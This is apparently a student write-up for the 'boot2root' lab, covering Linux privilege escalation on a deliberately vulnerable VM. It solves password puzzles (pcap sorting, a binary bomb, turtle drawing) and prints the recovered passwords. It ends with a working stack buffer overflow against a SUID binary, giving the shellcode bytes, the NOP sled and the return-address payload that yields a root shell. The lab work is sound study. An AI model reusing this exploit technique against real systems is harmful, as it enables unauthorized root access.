# boot2root

## Contents

- [Info](#info)
- [Writeups](#writeups)
    - [Writeup 1](#writeup-1)
        - [lmezard](#lmezard)
        - [laurie](#laurie)
        - [thor](#thor)
        - [zaz](#zaz)
    - [Writeup 2](#writeup-1)
    - [Writeup 3](#writeup-1)
    - [Writeup 4](#writeup-1)
    - [Writeup 5](#writeup-1)


## Info

Project about multiple privilege escalations on Linux.

- Status: finished
- Result: 125%
- Observations: NULL

## Writeups

### Writeup 1

We try to launch the ISO an a VM but it asks for user and password, but the
subject did not provide one.

Let's inspect the ISO squashfs
(squashfs is a compressed read-only file system for Linux):
```bash
tar -xf BornToSecHackMe-v1.1.iso

# 42 mac is shit so I can't install squashfs-tools, so instead I created a
# docker image on the `./scripts` dir
cd ./scripts
docker build -t my-squashfs-tools:latest .
docker run -v /Volumes/PortableSSD/42/casper:/dev/shm -it my-squashfs-tools:latest
```

In the container run `unsquashfs`:
```bash
cd /dev/shm
unsquashfs filesystem.squashfs
```

A lot or errors will popup, ignore them, now let's see what's inside:
```bash
cd squashfs-root/

# Let's add `tree` to easily enumerate dirs
apk add tree
cd home && tree
```

Results:
```raw
.
├── LOOKATME
│   └── password
├── ft_root
│   ├── Desktop
│   └── mail
│       ├── INBOX.Drafts
│       ├── INBOX.Sent
│       └── INBOX.Trash
├── laurie
│   ├── README
│   └── bomb
├── laurie@borntosec.net
│   └── mail
│       ├── INBOX.Drafts
│       ├── INBOX.Sent
│       └── INBOX.Trash
├── lmezard
│   ├── README
│   └── fun
├── thor
│   ├── README
│   └── turtle
└── zaz
    ├── exploit_me
    └── mail
        ├── INBOX.Drafts
        ├── INBOX.Sent
        └── INBOX.Trash
```

Inspecting the ISO on the host fs we found

Inspecting the files we find that:
- `LOOKATME`:
    - Has a password file for `lmezard`, that's our foothold to the machine.
- `ft_root`:
    - Has a `Desktop` dir, but is empty.
    - Note this users is not the real `root`.
- `laurie`:
    - Has a challange that will give us the `thor` user password.
    - The challenge is a binary called `bomb`.
- `lmezard`:
    - Has a challenge that will give us the `laurie` user password.
    - The challenge is a `tar` file full of `pcap`s.
- `thor`:
    - Has a challenge that will give us the `zaz` user password.
    - The challenge is a text file `turtle` that is full of instructions (1471 lines).
- `zaz`:
    - Has a binary `exploit_me`, owned by root.
- All the users have mailboxes, we will check them later.

#### lmezard

Login as `lmezard` with the provided password:
```bash
cat /dev/shm/squashfs-root/home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```

We try to connect to the machine using `ssh` without success, login locally
we check the `/etc/sshd_config` file and found out that `lmezard` is not allowed
to login via `ssh`:
```raw
AllowUsers ft_root zaz thor laurie
```

This is gonna be a headache, I'm a dvorak user and I don't remember
the US layout... Hope `lmezard` challenge is easy and we can login as other
user via `ssh` as soon as possible.

Untar `fun` to other dir where we have perms:
```bash
tar -xf fun -C /dev/shm
cd /dev/shm/ft_fun
```

There are a lot of `pcap` files, let's try `strings`:
```bash
strings * | less
```

We find a lot of `printf("Hahahaha Got you!!!\n");`, and a lot of
`} void useless() {` strings, but other strings got my attention:
```c
char getme10() {
    return 'a';
}
```

It seems to me like there are at least 10 `getme` functions, eachone returning
a character, probably of the `laurie` password, so let's grep for those
functions:
```bash
# The function `getme` seems to have a line for the `return`, in `grep` you can
# use `-B n` to set how many lines print before the match and `-A n` for the
# number of lines after the match, so we can `grep` for `getme` and print one
# line below each time
cat * | grep -A 1 'getme' | less
```

This is what we got:
```raw
//file431char getme4() {

--
//file373char getme7() {

//file736char getme1() {

--
//file668char getme5() {

--
//file722char getme6() {

--
//file138char getme3() {

--
char getme8() {
    return 'w';
--
char getme9() {
    return 'n';
--
char getme10 {
    return 'a';
--
char getme11() {
    return 'g';
--
char getme12
{
--
    printf("%c",getme1());
    printf("%c",getme2());
    printf("%c",getme3());
    printf("%c",getme4());
    printf("%c",getme5());
    printf("%c",getme6());
    printf("%c",getme7());
    printf("%c",getme8());
    printf("%c",getme9());
    printf("%c",getme10());
    printf("%c",getme11());
    printf("%c",getme12());
    printf("\n");
--
//file632char getme2() {
```

We notice that each `pcap` ends with a comment `//fileXX` that indicates
probably the order, so let's make a program to sort them and then displays them
in the correcd order.

The file is in: `./scripts/pcap_sorter.cc`, it will sort and print the files
in the correct order, compile it and run it
(it will expect the directory `./ft_fun`):
```bash
g++ -std=c++17 main.cc
./a.out > source.c
gcc source.c
./a.out
```

And that gives us:
```raw
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

Let's obey and do it:
```bash
echo -n 'Iheartpwnage' | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

#### laurie

Let's login as `laurie`.

The challenge of this user is the `bomb` binay, let's run to see what it does:
```bash
laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!

foo

BOOM!!!
The bomb has blown up.
```

And we have some hint in the `README`:
```raw
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

By reversing the binary and running some gdb, which I will not exploin, we
find that the phase 1 is just expecting some literal string:
```raw
Public speaking is very easy.
```

Passed, phase 2 is more complex, it expects 6 numbers, it runs
`sscanf("%d %d %d %d %d %d", ...)`, and then checks that the first number is
`1`, and for the other 5 numbers, it expects this:
```raw
n      == current number
index  == index of the number
prev_n == previus number

n == index * prev_n
```

For the sequence `1 2 3 4 5 6`, it will check (skipping the first number, which
must be `1`):
```c
2 == 2 * 1
3 == 3 * 2 // KO
4 == 4 * 3 // KO
5 == 5 * 4 // KO
6 == 6 * 5 // KO
```

A little thinking gives us the following equation, just keep resolving it
for 5 numbers, that will be our sequence:
```c
2 == 2 * 1
? == 3 * 2
```
```c
2   == 2 * 1
6   == 3 * 2
24  == 4 * 6
120 == 5 * 24
720 == 6 * 120
```

Seems good, and indeed, the following sequence worked for phase 2:
```raw
1 2 6 24 120 720
```

It worked! I also notice we can create a file and pass it as a parameter, so
`bomb` will read for it and when it ends it change to `stdin`, whichi means
we can save there what we have until know, so when we execute `bomb` we
start in the phase we ane currently in:
```bash
echo 'Public speaking is very easy.' > defuse
echo '1 2 6 24 120 720' >> defuse

./bomb ./defuse
```

Let's go whith phase 3, it seems this phase runs `sscanf("%d %c %d")`, and
then it has varius cases depending on the value of the first `%d`.

But, in short, it will expect a specific `%c` and `%d` on each case, let's
focus on only one, the first one, which is with if the first `%d == 0`.

It will check that the other `%d == 777`, and it will save a `'q'` in a local
variable, to later check that `%c == local_variable`, so the payload will be:
```raw
0 q 777
```

Save it in the `./defuse` file and let's continue with phase 4.

This phase runs `sscanf("%d")`, it explodes if the `value < 1`, and
then it calls a function passing it as parameter, and expects the return to
be `55`, or it explodes. So, we know our value must be `>= 1`.

That mysterious function is recursive, and it does something in the lines of:
```c
int function(int n)
{
    int n1;
    int n2;

    if (n < 2) {
        n2 = 1;
    } else {
        n1 = function(n - 1);
        n2 = function(n - 2);
        n2 = n2 + n1;
    }
    return n2;
}
```

So, I made a `./scripts/phase4.c` file that bruteforces this until it returns
`55`, the results is `9`. Add it to the `defuse` file.

Phase 5, this is getting harder... Let's break this phase down:
- It uses a custom `strlen` that works as expected, and checks our input has a length of `6`.
- Then it does an `AND <character>,15` for each character, and using the result as an index, it saves the corresping element from the array `"isrveawhobpnutfg"` in a local variable.
- Then it compares that local variable with `"giants"`, using a custom `strcmp`, that I hope is implemented as expected, because I don't want to check it.

We need to find a suitable string, let's make a program that finds it for us,
check it at `./scripts/phase5.c`.

The result string is:
```raw
o`ekma
```

Phase 6, the last phase, as expected, this one seems difficult.

It seems is reads 6 numbers with `sscanf("%d %d %d %d %d %d")`.

Later it makes a lot of checks, let's break them down:
- It iterates and checks that (being `n` the number):
    - If `n - 1 > 5` explodes, so `n` must be `n <= 6`.
    - It also checks that there are not duplicate numbers.
- It copies the values to a local array, but ff `n > 1` it does a lot of weird things with a global array a 2D int matrix.
- ...

So sorry, but knowing tha the hint is `4`, we know that's the first number, so
I'm just gonna bruteforce it.

Compile and launch `./scripts/phase6.c`, the resulting combination is:
```raw
Cracked: 4 2 6 3 1 5
```

As the subject suggest, the password of the next user (`thor`) is the
combination off all the solutions, so:
```raw
Public speaking is very easy.
1 2 6 24 120 720
0 q 777
9
o`ekma
4 2 6 3 1 5
```

Let's remove the spaces:
```raw
Publicspeakingisveryeasy.126241207200q7779o`ekma426315
```

But it didn't work, after some research I found out that, becasue two levels
solution can vary, one is the phase 3, were multiple inputs are valid, but
if we look at the `hints` file, the valid input contains a `b`, I was doing the
`q` case, so the valid answer is:
```raw
1 b 214
```

Now, the password should work:
```raw
Publicspeakingisveryeasy.126241207201b2149o`ekma426315
```

But, no, the phase 5 also have multiple valid answer, the expected one was:
```bash
opekmq
```

And phase 6 also has another valid answer it seems, we just need to swap `3` and `1`:
```raw
4 2 6 1 3 5
```

So, let's change our password one more time:
```raw
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

I do not like this project at all, the phase 3 variation was okey because
the `hint` helped, but the phase 5 and phase 6 multiple solutions can't be
justified.

#### thor

This one is easy, I'm not proud of where I came from, but I came from python
and C#, and this seems like `turtle`s instructions!

So, because I'm now proud of where I am, I'm of course gonna make all the
programs in C or C++, with no exception, so, I created a C++ program that
will parse a file like the one we are given, and generates a `.py` script
with `turtle`, that we can run.

The program is located at `./scripts/turtle_parser.cc`, just run it with
the file as first parameter. We'll need to retrieve the file from the machine
becouse we can't run a graphics program like `turtle` in it:
```bash
cd ./scripts
./recv thor turtle
g++ turtle_parser.cc -o turtle_parser
./turtle_parser ./files/turtle out.py

python3 ./out.py
```

The drawing is a bit strange, let's try to identify the letters one by one while
it's drawing them.

The resulting word is:
```raw
SLASH
```

The `turtle` file also tells us to "digest" the message
(MD5 is a "message-digest" algo):
I spent I while, but eventually I figure that like a previus user, the actual
password is `SLASH` hashed:
```raw
echo -n 'SLASH' | md5sum
```

#### zaz

The `mail` files are empty, let's check the `exploit_me` binary, that is owned
by `root` and has the `SUID` bit.

I tried a large input and it segfaulted, so it's seems like a BOF.
```bash
zaz@BornToSecHackMe:~$ ./exploit_me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped
```

It's a pretty simple binary, it was easy to reverse, this is the source code:
```c
int main(int argc,char **argv)
{
	char buff[140];

	if (argc > 1) {
		strcpy(buff, argv[1]);
		puts(buff);
	}
	return (int)(argc < 2);
}
```

So yeah... It's a simple BOF, that `strcpy` is sus.

Let's do the usual, open it with `gdb` and send a pattern payload large enought
to overflow `buff`:
```bash
gdb -q ./exploit_me
r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
```

Let's calculate the offset, remember the OS is little endian, so `0x37654136`
would be: `6Ae7`. That's `140` offset, we could have guessed that of course,
but I prefer to be sure.

So, get some [shellcode](https://shell-storm.org/shellcode/files/shellcode-752.html),
export it in a env variable with a `nop` sled of course, and compile our
`./scripts/getaddr.c` to get the env variable address.

```bash
export SC=$(python -c "print '\x90'*100+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")

gcc getaddr.c -o getaddr
./getaddr SC
# SC address: 0xXXXXXXXX
```

Forge the payload:
- `140` offset bytes.
- Shellcode address in little-endian.

```bash
# SC address: 0xbffffeb3
./exploit_me $(python -c "print 'A'*140+'\xb3\xfe\xff\xbf'")
```

And there we go:
```bash
# whoami
root
```

### Writeup 2

`TODO`...
